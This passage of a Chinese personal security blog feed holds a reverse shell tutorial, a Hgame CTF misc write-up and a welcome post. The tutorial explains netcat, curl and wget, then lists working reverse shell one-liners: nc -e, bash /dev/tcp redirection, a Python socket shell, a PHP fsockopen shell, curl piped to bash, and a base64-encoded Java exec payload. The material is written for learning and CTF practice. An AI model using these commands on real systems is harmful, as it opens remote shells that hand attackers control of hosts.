链时，除 <code>__construct</code>  函数一般不需要写出，   变量的权限与源码保持一致，在串联对象时，需要与源码的对应关系保持一致，比如： <code>$b -&gt; file['filename'] = $c;</code></p><p>————END————</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php-unserialize&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#php-unserialize&quot;&gt;#&lt;/a&gt; PHP Unserialize&lt;/h1&gt;
&lt;h2 id=&quot;什么是序列化和反序列化&quot;&gt;&lt;a class=&quot;mark</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Reverse shell</title>
    <link href="http://example.com/2024/04/09/Reverse-shell/"/>
    <id>http://example.com/2024/04/09/Reverse-shell/</id>
    <published>2024-04-09T04:29:05.000Z</published>
    <updated>2024-04-11T03:47:13.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell">#</a> 反弹 shell</h1><h2 id="反弹shell-2"><a class="markdownIt-Anchor" href="#反弹shell-2">#</a> 反弹 shell</h2><h3 id="linux环境下常用网络工具"><a class="markdownIt-Anchor" href="#linux环境下常用网络工具">#</a> linux 环境下常用网络工具</h3><h4 id="ncnetcat"><a class="markdownIt-Anchor" href="#ncnetcat">#</a> nc(netcat)</h4><p>参数说明</p><pre><code>nc.exe -h 即可看到各参数的使用方法。基本格式：nc [-options] hostname port[s] [ports] ...nc -l -p port [options] [hostname] [port]-d          后台模式-e          程序重定向，一旦连接，就执行 [危险!!]-g gateway  source-routing hop point[s], up to 8    设置路由器跃程通信网关，最多可设置8个。-G num      source-routing pointer: 4, 8, 12, ...   设置来源路由指向器，其数值为4的倍数。-h          帮助信息-i secs     延时的间隔-l          监听模式，用于入站连接 (监听本地端口)-L          连接关闭后,仍然继续监听-n          指定数字的IP地址，不能用hostname。即直接使用IP地址，而不通过域名服务器。-o file     指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。-p port     本地端口号 (指定本地端口 )-r          随机本地及远程端口-s addr     本地源地址-t          使用TELNET交互方式(用telnet来回应 )-u          UDP模式-v          详细输出--用两个-v( -vv)可得到更详细的内容. 获得端口信息-w secs     timeout的时间-z          将输入输出关掉--只用于扫描. 端口的表示方法可写为M-N的范围格式。</code></pre><p>连接远程主机</p><p>​ <code>nc -nvv Target_ip Target_port</code></p><p>监听本地主机</p><p>​ <code>nc -l -p Local_port</code></p><p>端口扫描</p><p>​ <code>nc -v Target_ip Target_port #可指定范围</code></p><p>端口监听</p><p>​ <code>nc -l -p Local_port</code></p><p>远程文件传输</p><p>​ <code>nc Target_ip Target_port &lt; Target_File</code></p><p>模拟 HTTP headers</p><pre><code>[root@hatest1 ~]# nc www.linuxfly.org 80 GET / HTTP/1.1 Host: ispconfig.org Referrer: mypage.com User-Agent: my-browserHTTP/1.1 200 OK Date: Tue, 16 Dec 2008 07:23:24 GMT Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8 Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/ Expires: 0 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Cache-Control: private, post-check=0, pre-check=0, max-age=0 Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/ Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html [......]echo -n &quot;GET / HTTP/1.0&quot;r&quot;n&quot;r&quot;n&quot; | nc host.example.com 80连接到主机并执行</code></pre><p>正向 shell，反向 shell</p><h4 id="curl"><a class="markdownIt-Anchor" href="#curl">#</a> curl</h4><p>HTTP 命令行工具，支持文件的上传和下载，是综合传输工具</p><p>发送 GET 请求</p><p>​ <code>curl URL?a=1&amp;b=nihao</code></p><p>发送 POST 请求</p><p>​ <code>curl -X POST -d 'a=1&amp;b=nihao' URL</code></p><p>发送 json 格式请求</p><p>​ <code>curl -H &quot;Content-type: application?json&quot; -X POST -d '&#123;&quot;abc&quot;:123.&quot;bcd&quot;:&quot;nihao&quot;&#125;' URL</code></p><p>​ <code>curl -H &quot;Content-Type: application/json&quot; -X POST -d @test.json URL</code></p><h5 id="1-下载option-o或者option-o"><a class="markdownIt-Anchor" href="#1-下载option-o或者option-o">#</a> 1、下载 (option:-o 或者 option:-O)</h5><p>1.1、下载页面：</p><p><code>curl -o dodo1.jpg http:www.linux.com/dodo1.JPG</code> <br># 要注意 - O 这里后面的 url 要具体到某个文件，不然抓不下来<br> <code>curl -O http://www.linux.com/dodo1.JPG</code></p><p>1.2：循环下载<br>有时候下载图片可以能是前面的部分名称是一样的，就最后的尾椎名不一样。这样就会把 dodo1，dodo2，dodo3，dodo4，dodo5 全部保存下来<br> <code>curl -O http://www.linux.com/dodo[1-5].JPG</code></p><p>1.3：下载重命名<br>在 hello/dodo1.JPG 的文件下载下来就会变成 hello_dodo1.JPG, 其他文件依此类推，从而有效的避免了文件被覆盖<br> <code>curl -o #1_#2.JPG http://www.linux.com/&#123;hello,bb&#125;/dodo[1-5].JPG</code></p><p>由于下载的 hello 与 bb 中的文件名都是 dodo1，dodo2，dodo3，dodo4，dodo5。因此第二次下载的会把第一次下载的覆盖，这样就需要对文件进行重命名。<br> <code>curl -O http://www.linux.com/&#123;hello,bb&#125;/dodo[1-5].JPG</code></p><p>1.4：分块下载 (option：-r)</p><p><code>curl -r 0-100 -o dodo1_part1.JPG http://www.linux.com/dodo1.JPG curl -r 100-200 -o dodo1_part2.JPG http://www.linux.com/dodo1.JPG curl -r 200- -o dodo1_part3.JPG http://www.linux.com/dodo1.JPG</code> <br> <code>cat dodo1_part* &gt; dodo1.JPG </code></p><p>#这样就可以查看 dodo1.JPG 的内容了</p><p>1.5：通过 ftp（文件传输协议）下载文件 (option：-u)<br> curl 可以通过 ftp 下载文件，curl 提供两种从 ftp 中下载的语法<br> <code>curl -O -u 用户名:密码 ftp://www.linux.com/dodo1.JPG</code> <br> <code>curl -O ftp://用户名:密码@www.linux.com/dodo1.JPG</code></p><p>1.6: 下载，显示进度条 (option：-#) 或不显示进度条 (option：-s)<br> <code>curl -# -O http://www.linux.com/dodo1.JPG  </code> <br> <code>curl -s -O http://www.linux.com/dodo1.JPG</code></p><p>1.7、下载，断点续传 (-C <offset>)<br> 断点续转，从文件头的指定位置开始继续下载 / 上传；offset 续传开始的位置，如果 offset 值为 “-”，curl 会自动从文件中识别起始位置开始传输；<br> <code>curl -# -o centos6.8.iso -C - http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso</code> <br> <code>curl -C -O http://www.linux.com/dodo1.JPG</code></offset></p><h5 id="2-上传文件option-t"><a class="markdownIt-Anchor" href="#2-上传文件option-t">#</a> 2、上传文件 (option:-T)</h5><p><code>curl -T dodo1.JPG -u 用户名:密码 ftp://www.linux.com/img/</code></p><h5 id="3-伪造来源页面伪造referer盗链-option-e"><a class="markdownIt-Anchor" href="#3-伪造来源页面伪造referer盗链-option-e">#</a> 3、伪造来源页面 | 伪造 referer | 盗链 (option：-e)</h5><p>很多服务器会检查 http 访问的 referer 从而来控制访问。比如：你是先访问首页，然后再访问首页中的邮箱页面，这里访问邮箱的 referer 地址就是访问首页成功后的页面地址，如果服务器发现对邮箱页面访问的 referer 地址不是首页的地址，就断定那是个盗连了<br> #这样就会让服务器其以为你是从 www.linux.com 点击某个链接过来的<br> <code>curl -e &quot;www.linux.com&quot; http://mail.linux.com</code> <br># 告诉爱 E 族，我是从百度来的<br> <code>curl -e http://baidu.com http://aiezu.com</code></p><h5 id="4-伪造代理设备模仿浏览器"><a class="markdownIt-Anchor" href="#4-伪造代理设备模仿浏览器">#</a> 4、伪造代理设备 (模仿浏览器)</h5><p>有些网站需要使用特定的浏览器去访问他们，有些还需要使用某些特定的版本。curl 内置 option:-A 可以让我们指定浏览器去访问网站<br> <code>curl -A &quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.0)&quot; http://www.linux.com</code> <br># 告诉爱 E 族，我是 GOOGLE 爬虫蜘蛛（其实我是 curl 命令）<br> <code>curl -A &quot; Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; http://aiezu.com</code> <br># 告诉爱 E 族，我用的是微信内置浏览器<br> <code>curl -A &quot;Mozilla/5.0 AppleWebKit/600 Mobile MicroMessenger/6.0&quot; http://aiezu.com</code></p><h5 id="5-设置http请求"><a class="markdownIt-Anchor" href="#5-设置http请求">#</a> 5、设置 http 请求</h5><p>5.1、设置 http 请求头 (或 option:-H 或 option:–head)<br> <code>curl -H &quot;Cache-Control:no-cache&quot;  http://aiezu.com</code></p><p>5.2、指定 proxy 服务器以及其端口 (option::-x)<br># 很多时候上网需要用到代理服务器 (比如是使用代理服务器上网或者因为使用 curl 别人网站而被别人屏蔽 IP 地址的时候)，幸运的是 curl 通过使用内置 option：-x 来支持设置代理<br> <code>curl -x 192.168.100.100:1080 http://www.linux.com</code></p><h5 id="6-http响应头"><a class="markdownIt-Anchor" href="#6-http响应头">#</a> 6、http 响应头</h5><p>6.1、查看 http 响应头 (option:-I)<br># 看看本站的 http 头是怎么样的<br> <code>curl -I  http://aiezu.com</code> <br> 输出：<br>HTTP/1.1 200 OK<br>Date: Fri, 25 Nov 2016 16:45:49 GMT<br>Server: Apache<br>Set-Cookie: rox__Session=abdrt8vesprhnpc3f63p1df7j4; path=/<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br>Pragma: no-cache<br>Vary: Accept-Encoding<br>Content-Type: text/html; charset=utf-8</p><p>6.2、保存 http 的 response 里面的 header 信息 (option:-D)<br> <code>curl -D cookied.txt http://www.linux.com</code> <br> 执行后 cookie 信息就被存到了 cookied.txt 里面了<br>注意：-c (小写) 产生的 cookie 和 - D 里面的 cookie 是不一样的。</p><h5 id="7-发送表单数据"><a class="markdownIt-Anchor" href="#7-发送表单数据">#</a> 7、发送表单数据</h5><p><code>curl -F &quot;pic=@logo.png&quot; -F &quot;site=aiezu&quot;  http://aiezu.com/</code></p><h5 id="8-cookie"><a class="markdownIt-Anchor" href="#8-cookie">#</a> 8、cookie</h5><p>8.1、发送 cookie (option:-b）<br># 有些网站是使用 cookie 来记录 session 信息。对于 chrome 这样的浏览器，可以轻易处理 cookie 信息，但在 curl 中只要增加相关参数也是可以很容易的处理 cookie<br> <code>curl -b &quot;domain=aiezu.com&quot;  http://aiezu.com</code> <br># 很多网站都是通过监视你的 cookie 信息来判断你是否按规矩访问他们的网站的，因此我们需要使用保存的 cookie 信息。内置 option: -b<br> <code>curl -b cookiec.txt http://www.linux.com</code></p><p>8.2、保存 http 的 response 里面的 cookie 信息 (option:-c）<br>执行后 http 的 response 里面的 cookie 信息就被存到了 cookiec.txt 里面了<br> <code>curl -c cookiec.txt  http://www.linux.com</code></p><h4 id="wget"><a class="markdownIt-Anchor" href="#wget">#</a> wget</h4><p>wget 是一个下载文件的工具，它用在命令行下。对于 Linux 用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。</p><p><code>wget URL</code></p><h5 id="与curl区别"><a class="markdownIt-Anchor" href="#与curl区别">#</a> 与 curl 区别</h5><p>wget 是个专职的下载利器，简单，专一，极致；而 curl 可以下载，但是长项不在于下载，而在于模拟提交 web 数据，POST/GET 请求，调试网页，等等。在下载上，也各有所长，wget 可以递归，支持断点；而 curl 支持 URL 中加入变量，因此可以批量下载。个人用途上，我经常用 wget 来下载文件，加 -c 选项不怕断网；使用 curl 来跟网站的 API 交互，简便清晰。</p><h4 id="ping"><a class="markdownIt-Anchor" href="#ping">#</a> ping</h4><p>ping 命令本身处于应用层，相当于一个应用程序，它直接使用网络层的 ICMP 协议，ping 用来检查网络是否通畅或者网络连接速度的命令。</p><h4 id="talent"><a class="markdownIt-Anchor" href="#talent">#</a> talent</h4><p>telnet 协议是 TCP/IP 协议族的其中之一，是 Internet 远端登录服务的标准协议和主要方式，常用于网页服务器的远端控制，可供使用者在本地主机执行远端主机上的工作。telnet 通常是用来探测指定 ip 是否开放指定端口。</p><p>open : 使用 openhostname 可以建立到主机的 Telnet 连接。</p><p>close : 使用命令 close 命令可以关闭现有的 Telnet 连接。</p><p>display : 使用 display 命令可以查看 Telnet 客户端的当前设置。</p><p>send : 使用 send 命令可以向 Telnet 服务器发送命令。支持以下命令：</p><p>ao : 放弃输出命令。</p><p>ayt : “Are you there” 命令。</p><p>esc : 发送当前的转义字符。</p><p>ip : 中断进程命令。</p><p>synch : 执行 Telnet 同步操作。</p><p>brk : 发送信号。quit ：使用 quit 命令可以退出 Telnet 客户端。</p><h4 id="ssh"><a class="markdownIt-Anchor" href="#ssh">#</a> ssh</h4><p>简单来说，ssh 和 telnet 是实现相同的功能，ssh 中 数据是经过加密的，是安全的，而 Telnet 是明文传输的，ssh 是加密的，基于 SSL 。</p><h3 id="正向shell如何连接"><a class="markdownIt-Anchor" href="#正向shell如何连接">#</a> 正向 shell 如何连接</h3><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。</p><p>目标主机： <code>nc -lvp Target_port -e /bin/sh</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/BuPk7DwXMoHmEl3.png" alt="image.png"></p><p>本地主机：  <code>nc Target_ip Target_port</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/a9okGwVWhypUD4m.png" alt="image.png"></p><h3 id="什么是反弹shell"><a class="markdownIt-Anchor" href="#什么是反弹shell">#</a> 什么是反弹 shell</h3><p>参考：<a class="link" href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>反弹 shell（reverse shell），就是控制端监听在某 TCP/UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。</p><p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。那么什么情况下正向连接不能用了呢？</p><p>有如下情况：</p><p>1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2. 目标机器的 ip 动态改变，你不能持续控制。</p><p>3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p><p>反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果具有 python 环境，那我们可以利用 python 反弹 shell。如果具有 php 环境，那我们可以利用 php 反弹 shell。</p><h3 id="反弹shell的方式"><a class="markdownIt-Anchor" href="#反弹shell的方式">#</a> 反弹 shell 的方式</h3><h4 id="netcat"><a class="markdownIt-Anchor" href="#netcat">#</a> netcat</h4><p>攻击机开启监听：  <code>nc -lvp Target_port</code></p><p>-lvp：l 监听，v 输出交互过程，p 端口</p><p>靶机连接攻击机：  <code>nc Target_ip Target_port -e /bin/bash</code></p><h4 id="bash"><a class="markdownIt-Anchor" href="#bash">#</a> bash</h4><p>Bash 反弹 shell 的方法非常好用，题目的服务器环境可能没有 nc, 但是一定会有 bash</p><p>同样的我们还是用 nc -lvp Target_Port 在攻击机的端口开启监听</p><p><code>nc -lvp Target_Port</code></p><p>这次我们使用 Bash 结合重定向来反弹 shell</p><p><code>bash -i &gt;&amp; /dev/tcp/Target_ip/Target_port 0&gt;&amp;1</code></p><p>或者  <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/Target_ip/Target_port 0&gt;&amp;1&quot;</code></p><p>推荐使用后者，使用前者弹 shell, 当命令在服务端 shell 中执行时可能存在 /bin/sh 的软连接并不指向 bash 的问题，导致报错 <code>/bin/sh: 1:Syntax error:Bad fd number</code></p><p>bash -i 产生 bash 交互环境 &gt;&amp; 将联合符号前后内容结合，重定向给后者，/dev/tcp/Target_IP/Target_Port 让目标主机发起与攻击机在 Target_Port 上的 TCP 连接，0&gt;&amp;1 将标准输入和标准输出的内容相结合，重定向给前面标准输出的内容。</p><p>Bash 产生了一个交互环境和本地主机主动发起与攻击机端口建立的连接相结合，然后在重定向个 TCP 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。</p><p>[关于上述 bash 命令的详细解释](<a class="link" href="https://www.cnblogs.com/pandana/p/16289320.html">反弹 bash shell 命令详解 - pandaes - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p><h4 id="pythion反弹shell"><a class="markdownIt-Anchor" href="#pythion反弹shell">#</a> Pythion 反弹 shell</h4><p>同样的我们还是在攻击机开始端口监听， <code>nc -lvp Target_Port</code></p><p>在靶机上执行 <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;Target_IP&quot;,Target_Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p><h4 id="curl反弹shell"><a class="markdownIt-Anchor" href="#curl反弹shell">#</a> curl 反弹 shell</h4><p>简单来说就是将 Bash 重定向这一句内容写入文件，让靶机用 curl 下载这个文件并且执行，达到用 Bash 重定向相同的效果</p><p>首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：</p><p><code>bash -i &gt;&amp; /dev/tcp/Target_IP/Target_Port 0&gt;&amp;1</code>  或者 <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/Target_IP/Target_Port 0&gt;&amp;1&quot;</code> ，而 java 的 RCE 需要用 base64 编码，Payload: <code>Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</code></p><p>然后在目标机上执行如下，即可反弹 shell</p><p><code>curl Target_IP|bash</code></p><h4 id="php反弹shell"><a class="markdownIt-Anchor" href="#php反弹shell">#</a> php 反弹 shell</h4><p>攻击机：  <code>nc -nvlp Target_port</code></p><p>靶机：  <code>php -r '$sock=fsockopen(&quot;192.168.37.131&quot;,1234);     exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</code></p><h4 id="others"><a class="markdownIt-Anchor" href="#others">#</a> <strong>Others</strong></h4><p>反弹 shell 的方式很多，nc 和 bash 是比较常见的方式，其他还有 Telnet，Socat 等工具可以反弹 shell，或者写个 python，php 等脚本也可以反弹 shell，比较琐碎的内容具体遇到了再查即可。</p><p>————END————</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;反弹shell&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#反弹shell&quot;&gt;#&lt;/a&gt; 反弹 shell&lt;/h1&gt;
&lt;h2 id=&quot;反弹shell-2&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#反弹s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hgame FINAL WP</title>
    <link href="http://example.com/2024/04/06/Hgame-FINAL-WP/"/>
    <id>http://example.com/2024/04/06/Hgame-FINAL-WP/</id>
    <published>2024-04-06T05:09:37.000Z</published>
    <updated>2024-04-06T15:45:00.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hgame-final-wp"><a class="markdownIt-Anchor" href="#hgame-final-wp">#</a> Hgame FINAL WP</h1><h3 id="author-fc04db"><a class="markdownIt-Anchor" href="#author-fc04db">#</a> author: Fc04dB</h3><h4 id="1看不见的字"><a class="markdownIt-Anchor" href="#1看不见的字">#</a> 1. 看不见的字</h4><p>题目提示 npm install zero-width-lib , 网上搜了一下，是零宽字符隐藏文本加密（npm 没有研究，最后发现也没用到），翻了很多文章，找到一个在线解密的网站:</p><pre><code>https://yuanfux.github.io/zero-width-web/</code></pre><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/5o1U97eAqYQismD.png" alt="image-5.png"></p><p>直接得到 flag</p><p>顺便贴一张其他人写的脚本</p><pre><code>import * as z from 'zero-width-lib';// 这是要解密的字符串，包含零宽度字符const encodedString = 'h\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\uFEFF\uFEFF\u200D\u200B\uFEFF\u200D\uFEFF\u200B\u200C\u200E\u200F\u200B\uFEFF\u200F\u200D\u200B\u200D\uFEFF\uFEFF\u200B\u200F\uFEFF\u200D\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFEFF\u200E\u200B\uFEFF\u200E\uFEFF\u200B\uFEFF\u200E\u200D\u200B\u200D\uFEFF\u200C\u200B\uFEFF\u200F\uFEFF\u200B\uFEFF\u200E\u200F\u200B\u200D\uFEFF\u200E\u200B\uFEFF\u200E\u200C\u200B\u200F\uFEFF\uFEFF\u200B\uFEFF\u200C\u200E\u200B\u200C\u200E\u200C\u200B\uFEFF\u200F\u200D\u200B\u200F\u200E\u200E\u200Eello';// 使用zero-width-lib的decode方法来解密字符串const decoded = z.decode(encodedString);console.log(decoded);</code></pre><h4 id="2逮虾户"><a class="markdownIt-Anchor" href="#2逮虾户">#</a> 2. 逮虾户</h4><p>附件一个 dmg 文件是 moc 系统磁盘文件，7z 直接提取，一个需要密码的压缩包，一个 png 文件，密码应该就在 png 文件里，然后用 binwalk,foremost,stegsolve,zsteg，好多工具都找不到隐写内容，后来在学长的提示下是 piet 编程语言，然后下载 npiet 执行文件得到密码</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/G8mMqgDk1SsWvZY.png" alt="image-1.png"></p><p>打开 7z 文件，是一个逮虾户歌曲，尝试 MP3 隐写的解题方法，一无所获，再次请教学长，<br>信息在歌词里，想着把歌词提取出来，最后利用 elisa 播放器找到 passward</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/LNGMryJA8k6wZ1P.png" alt="image-2.png"></p><pre><code>q:UVmoa,Qo^Dp.D9e#wsFUm059mhNT</code></pre><p>诶？长得也不像 flag，然后学长提醒有一个 zip 文件没找到，用 binwalk 处理那个 MP3 文件，提取到 zip 文件</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/cOj7TSAnlZ6RYoe.png" alt="image-3.png"></p><p>打开之后是一个 jdvu 文件，记事本打不开，百度，要下载 windjview，然后就可以看到 flag</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/06/v6Ft4xIYHSd7LAk.png" alt="image-4.png"></p><pre><code>Hgame&#123;d3j45_i_kn0w&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hgame-final-wp&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#hgame-final-wp&quot;&gt;#&lt;/a&gt; Hgame FINAL WP&lt;/h1&gt;
&lt;h3 id=&quot;author-fc04db&quot;&gt;&lt;a class=&quot;markd</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Welcome to Fc04dB&#39;s BLOG</title>
    <link href="http://example.com/2024/04/03/My-New-Post/"/>
    <id>http://example.com/2024/04/03/My-New-Post/</id>
    <published>2024-04-03T12:29:21.000Z</published>
    <updated>2024-04-06T05:15:32.675Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WELCOME"><a href="#WELCOME" class="headerlink" title="WELCOME!!!!!"></a>WELCOME!!!!!</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WELCOME&quot;&gt;&lt;a href=&quot;#WELCOME&quot; class=&quot;headerlink&quot; title=&quot;WELCOME!!!!!&quot;&gt;&lt;/a&gt;WELCOME!!!!!&lt;/h1&gt;</summary>
      
    
    
    
    
  </entry>
  
</feed>
